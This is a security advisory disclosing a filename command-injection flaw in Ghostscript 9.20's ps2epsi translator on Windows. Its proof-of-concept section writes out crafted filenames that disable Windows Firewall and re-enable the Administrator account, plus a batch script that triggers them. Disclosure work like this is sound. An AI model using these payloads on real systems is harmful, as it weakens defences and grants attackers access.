@@ -1,0 +1,123 @@
+[+]#################################################################################################
+[+] Credits: John Page AKA hyp3rlinx
+[+] Website: hyp3rlinx.altervista.org
+[+] Source: http://hyp3rlinx.altervista.org/advisories/GHOSTSCRIPT-FILENAME-COMMAND-EXECUTION.txt
+[+] ISR: ApparitionSec
+[+]################################################################################################
+
+
+
+Vendor:
+===============
+ghostscript.com
+
+
+
+Product:
+================
+Ghostscript 9.20
+gs920w32.exe
+Windows (32 bit)
+hash: fee2cc1b8b467888a4ed44dd9f4567ed
+
+
+Ghostscript is a suite of software based Postscript and PDF
+interpreter/renderers for file conversion.
+
+
+Vulnerability Type:
+==========================
+Filename Command Execution
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Security Issue:
+================
+The ghostscript ps2epsi translator to processes ".ps" files executes
+arbitrary commands from specially crafted filenames that contain
+OS commands as part of the processed postscript files name. This feature
+seems to work only using the ps2epsi translator.
+Other tested GS translator calls like 'ps2pdf' fail.
+
+c:\>ps2epsi
+"Usage: ps2epsi <infile.ps> <outfile.epi>"
+
+Example, take a file "POC&<SYSTEM-COMMAND>;1.ps", it will run arbitrary
+Commands contained after the ampersand character "&".
+
+If a user runs some automated script to call the ps2epsi translator to
+process ".ps" files from a remote share or directory
+where actual filename is unknown, it can potentially allow attackers to
+execute arbitrary commands on victims machine.
+
+Characters like "/", ":" are restricted in filenames, but we can abuse
+Windows netsh and wmic to bypass some of these barriers.
+
+Quick Ghostscript CL test.
+Create file called Test&calc.exe;1.ps
+
+ps2epsi "Test&calc.exe;1.ps"  outfile
+
+BOOM! calc.exe runs...
+
+
+Exploit/POC:
+=============
+Add Ghostscript lib 'c:\Program Files (x86)\gs\gs9.20\lib' to Windows
+environmental Path, so we can easily call 'ps2epsi' GS CMD.
+
+Create the following malicious ".ps" postscript files.
+
+1) Turn of Windows Firewall
+Test&netsh Advfirewall set allprofiles state off&;1.ps
+
+
+2) Enable Windows Administrator account (using WMIC).
+Test&wmic useraccount where name='administrator' set disabled='false'&;1.ps
+
+If user don't have wmic on path, fix it for POC by set environmental system
+variable.
+Add "C:\Windows\system32\wbem;" to 'Path' variable.
+
+Run below bat script to process bunch of *.ps" files.
+
+"POC.bat"
+
+@echo off
+rem ghostscript Filename Command Execution POC
+rem by hyp3rlinx
+
+for %%1 in ("*.ps") do; ps2epsi  "%%1" "evil.ps"
+
+
+Severity:
+=========
+Medium
+
+
+
+Disclosure Timeline:
+===============================
+Vendor Notification: No replies
+February 2, 2017 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
